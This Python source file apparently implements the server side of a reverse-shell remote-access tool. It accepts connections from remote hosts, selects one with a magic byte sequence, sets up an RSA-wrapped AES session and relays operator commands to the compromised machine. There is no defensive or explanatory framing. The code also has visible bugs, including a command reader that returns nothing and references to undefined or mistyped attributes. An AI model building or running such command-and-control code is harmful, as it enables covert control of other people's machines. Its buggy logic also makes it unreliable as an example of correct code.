from CryptoAC.Asymmetric.Rsa import RSA
from CryptoAC.Symmetric.AcAes import AesCrypto
from .Connection import Connection
from .internalClient import InternalSocketClient
from Tools.toolsF import randombyte
import socket
import time
import threading



class Server(object):
    
    def __init__(self,PrivateKey,port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ServInfo = (
            socket.gethostbyname(socket.gethostname())
            ,port
        )
        self.rsa = RSA()
        self.lock = threading.Lock()
        self.PrivateKey = PrivateKey
        self.rsaBlock = (PrivateKey['n'].bit_length()+7)//8
        self.connection = Connection()
        self.connectTo = None
        self.connections = {}
        self.istest = False
        self.testMsg = bytes([100])
        self.sleepPerPing = 2 
        self.sleepPeriter = 2
        self._internalclient = InternalSocketClient()
        
    def __insertConnection__(self,addr):
        self.connections[addr[0]] = {
            'hostname':'aharon',
            'connected':False
        }

        
    def __rmConnections(self,ip):
        with self.lock:
            try: self.connections.remove(ip)
            except: pass
    
    
    def setCipher(self):
        msg = self.connection.conn.recv(self.rsaBlock)
        print(msg)
        key = self.rsa.decrypt(
            self.PrivateKey,
            msg
        )
        self.connection.aes = AesCrypto(key, None)
        self.connection.aes.set_iv(key)


    def ping(self, conn, timeout=5):
        try:
            conn.send(self.testMsg)
            conn.settimeout(timeout)
            response = conn.recv(3)
            conn.settimeout(None)
            if response:
                return True
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
            pass
        return False
    
    def __sendConnect__(self,conn,addr):
        conn.send(
            bytes([106, 125, 139, 23, 156, 162, 56, 40, 221, 20, 145, 82, 168, 87, 194, 241])
        )
        self.connectTo = None
        self.connection.addr = addr
        self.connection.conn = conn
        self.connections[addr[0]]['connected']=True
    
    
    def onConnect(self,conn,addr):
        self.__insertConnection__(addr)
        while True:
            print(self.connectTo)
            if self.connectTo == addr[0]:
                self.__sendConnect__(conn,addr)
                self.__handleWhileConnected__(addr[0])
            elif not self.ping(conn):
                print('NotPing')
                conn.close(), self.__rmConnections(addr[0])
                return
            time.sleep(self.sleepPeriter)


    def __handleWhileConnected__(self,ip):
        while self.connection.conn:
            time.sleep(self.sleepPerPing)
        self.connected.remove(ip)
            
                   
             
    def sendMsg(self, msg):
        msg = self.connection.aes.encrypt(msg)
        self.connection.conn.send(
            int.to_bytes(
                len(msg),
                length=4,
                byteorder='big',
            ) + msg
        )


    def recvMsg(self):
        header = int.from_bytes(self.connection.conn.recv(4))
        res = self.connection.conn.recv(header)
        while len(res) < header:
            res += self.connection.conn.recv(header-len(res))
        return self.connection.aes.decrypt(res)
        
        
    def readCommand(self):
        command = self._internalclient._read_msg().decode(errors='replace')
        self.sendMsg(command.encode())
    

    def outResult(self):
        self._internalclient._send_msg(self.recvMsg())

    def _setShellMode(self):
        while True:
            if self.connection.conn:
                print('Satrting RevrseShell...')
                self.setCipher()
                self.connection.reset()
                while True:
                    command = self.readCommand()
                    if command == 'exit':
                        self.connections[self.connection.addr]['connected']=False
                        self.connection = Connection()
                        break
                    self.outResult()
                    time.sleep(0.5)
            time.sleep(2)
        
    
        
    def __listener__(self):
        self.server.bind(self.ServInfo)
        self.server.listen()
        print("{+}Listening...")
        threading.Thread(target=self._setShellMode).start()
        while True:
            conn, addr = self.server.accept()
            print("Accept Connection.")
            threading.Thread(
                target=self.onConnect,
                args=(conn,addr)
            ).start()
            time.sleep(1)
            
    def start(self):
        threading.Thread(target=self.__listener__).start()
        